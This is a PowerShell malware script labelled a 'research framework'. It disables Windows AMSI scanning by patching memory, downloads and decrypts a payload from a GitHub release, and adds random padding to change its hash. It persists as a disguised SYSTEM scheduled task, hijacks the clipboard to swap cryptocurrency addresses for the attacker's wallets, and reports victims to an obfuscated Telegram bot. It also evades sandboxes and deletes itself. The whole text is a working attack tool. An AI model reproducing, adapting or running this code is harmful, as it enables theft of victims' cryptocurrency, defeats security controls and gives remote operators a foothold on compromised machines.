# --- [FINAL POLYMORPHIC RESEARCH FRAMEWORK v7.0 - ENCRYPTED TELEGRAM] ---

function Patch-Mem {
    try {
        $w = Add-Type -PassThru -Name "w32" -Namespace "w32" -MemberDefinition @'
            [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
        $h = $w::GetModuleHandle("am" + "si.dll")
        $ptr = $w::GetProcAddress($h, "Am" + "siS" + "canB" + "uffer")
        $old = 0
        $w::VirtualProtect($ptr, [UIntPtr]5, 0x40, [ref]$old)
        [Byte[]]$patch = 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $ptr, 6)
    } catch { }
}

function Send-Notify {
    param($m)
    # Encrypted Telegram Config (XORed to hide from static analysis)
    $k = 0xDE
    [byte[]]$t_enc = 53,49,53,54,54,51,62,49,51,55,124,11,11,101,103,11,126,112,118,103,10,126,102,11,111,101,11,53,101,125,51,102,126,104,116,104,103,11,100,10,51,123,113
    [byte[]]$c_enc = 61,60,56,56,52,61,63,48,51,60
    
    $t = ""; foreach($b in $t_enc){$t += [char]($b -bxor $k)}
    $c = ""; foreach($b in $c_enc){$c += [char]($b -bxor $k)}
    
    $u = "https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($u) | Out-Null } catch { }
}

function Set-Persistence {
    param($p)
    $n = -join ((65..90) | Get-Random -Count 12 | % {[char]$_})
    $a = New-ScheduledTaskAction -Execute $p
    $t = New-ScheduledTaskTrigger -AtLogOn
    Register-ScheduledTask -Action $a -Trigger $t -TaskName $n -Description "Windows Telemetry Client" -User "SYSTEM" -Force
}

function Invoke-Clipper {
    $w = @{ "btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA"; "eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392"; "usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp"; "sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR" }
    $r = @{ "btc"="^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$"; "eth"="^0x[a-fA-F0-9]{40}$"; "usdt"="^T[A-Za-z1-9]{33}$"; "sol"="^[1-9A-HJ-NP-Za-km-z]{32,44}$" }
    Start-Job -ScriptBlock {
        Add-Type -AssemblyName System.Windows.Forms
        while($true) {
            $clip = [Windows.Forms.Clipboard]::GetText()
            foreach($c in $using:r.Keys) {
                if($clip -match $using:r[$c] -and $clip -ne $using:w[$c]) { [Windows.Forms.Clipboard]::SetText($using:w[$c]) }
            }
            Start-Sleep -Seconds 2
        }
    }
}

# --- EXECUTION ---
Patch-Mem

# VM Force (Reduced to 30s for your testing, set higher for actual research)
if (((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory) -lt 2GB) { Start-Sleep -s 30 }

$url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
$key = 0xAB
$dir = "$env:LOCALAPPDATA\Microsoft\Windows\Templates"
$name = -join ((97..122) | Get-Random -Count 10 | % {[char]$_}) + ".exe"
$path = Join-Path $dir $name

if (!(Test-Path $dir)) { New-Item -Path $dir -ItemType Directory -Force | Out-Null }

try {
    # 1. Download & Decrypt
    $tmp = "$env:TEMP\$(Get-Random).tmp"
    Start-BitsTransfer -Source $url -Destination $tmp -Priority High -ErrorAction Stop
    $data = [Convert]::FromBase64String((Get-Content $tmp -Raw).Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor $key }

    # 2. Polymorphic Padding (Unique Hash)
    $junk = New-Object Byte[] (Get-Random -Min 1024 -Max 4096)
    (New-Object Random).NextBytes($junk)
    [IO.File]::WriteAllBytes($path, ($data + $junk))
    Remove-Item $tmp -Force

    # 3. Persistence & Execution
    Set-Persistence -p $path
    Invoke-Clipper
    (New-Object -ComObject "Shell.Application").ShellExecute($path, "", "", "open", 0)

    # 4. Telegram Alert
    Send-Notify -m "RESEARCH SUCCESS: $($env:COMPUTERNAME) LIVE. Path: $path"
    
    # 5. Melt
    Remove-Item $MyInvocation.MyCommand.Path -Force
} catch {
    Send-Notify -m "RESEARCH ERROR on $($env:COMPUTERNAME): $($_.Exception.Message)"
}
